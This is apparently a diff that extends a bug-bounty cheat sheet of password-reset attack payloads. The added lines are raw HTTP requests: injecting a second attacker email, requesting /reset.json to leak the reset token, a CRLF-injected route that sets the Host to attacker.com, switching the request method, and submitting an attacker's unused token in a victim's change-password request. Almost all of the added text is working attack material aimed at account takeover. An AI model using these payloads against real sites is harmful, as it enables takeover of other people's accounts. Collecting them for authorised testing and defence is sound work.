@@ -118,4 +118,35 @@ FUZZ
  - using separator , | OR  %20
   ```` email=victim@gmail.com,attacker@gmail.com ````
   
-  
+  #### APPENDING .JSON TO THE ENDPOINT
+  this may give the token in response
+  ````
+  POST /reset.json
+  HOST: target.com
+  ````
+  #### CRLF IN THE ROUTE
+  ````
+  POST /reset?%oa%odHost:attacker.com
+  Host: target.com
+  ````
+#### CHANGING REQUEST METHOD
+````
+PUT /reset
+host: target.com
+Content-Type: application/json
+
+email= victim@gmail.com
+````
+#### see response after sending email in reset endpoint , it may leak email and token
+
+### /reset/changepass
+
+put unused token of attacker@gmail.com after issuing reset pass in the field of victim's change pass request
+````
+POST /reset/change
+Host: target.com
+
+email=victim@gmail.com&token=[attacker_token]&old_pass=a&new_pass=b
+
+
+````
